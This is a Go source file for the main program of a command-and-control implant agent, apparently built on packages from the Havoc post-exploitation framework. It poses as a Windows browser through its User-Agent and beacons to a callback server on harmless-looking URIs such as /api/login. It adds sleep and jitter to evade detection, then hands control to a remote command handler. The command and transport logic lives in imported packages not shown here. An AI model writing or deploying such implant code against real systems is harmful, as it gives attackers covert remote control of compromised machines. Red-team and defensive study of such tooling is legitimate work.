package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"log"
	"runtime"

	"github.com/HavocFramework/GoITDemon/pkg/agent"
	"github.com/HavocFramework/GoITDemon/pkg/commands"
	"github.com/HavocFramework/GoITDemon/pkg/transport"
)

const (
	// Agent identification
	AGENT_TYPE    = "GoITDemon"
	AGENT_VERSION = "1.0.0"
	MAGIC_VALUE   = 0x41424344 // ABCD
)

func main() {
	// Initialize the IT Demon agent
	fmt.Printf("[+] Starting %s v%s\n", AGENT_TYPE, AGENT_VERSION)
	fmt.Printf("[+] Platform: %s/%s\n", runtime.GOOS, runtime.GOARCH)

	// Generate random agent ID
	agentID := generateAgentID()
	fmt.Printf("[+] Agent ID: %08x\n", agentID)

	// Initialize transport (HTTP by default, can be extended for SMB)
	transportConfig := &transport.Config{
		Method:    "GET",
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		Hosts: []transport.Host{
			{Address: "127.0.0.1", Port: 40056, Secure: false},
		},
		URIs: []string{
			"/api/login",
			"/api/session",
			"/api/check",
		},
	}

	// Create transport instance
	trans, err := transport.NewHTTPTransport(transportConfig)
	if err != nil {
		log.Fatalf("[-] Failed to create transport: %v", err)
	}

	// Initialize command handler
	cmdHandler := commands.NewHandler()

	// Create agent instance
	agentInstance := &agent.Agent{
		ID:           agentID,
		Type:         AGENT_TYPE,
		Version:      AGENT_VERSION,
		MagicValue:   MAGIC_VALUE,
		Transport:    trans,
		CmdHandler:   cmdHandler,
		SleepTime:    5000, // 5 seconds default
		Jitter:       10,   // 10% jitter
	}

	// Initialize agent
	if err := agentInstance.Initialize(); err != nil {
		log.Fatalf("[-] Failed to initialize agent: %v", err)
	}

	// Start main agent loop
	fmt.Println("[+] Agent initialized, starting main loop...")
	agentInstance.Run()
}

func generateAgentID() uint32 {
	var id uint32
	binary.Read(rand.Reader, binary.LittleEndian, &id)
	return id
}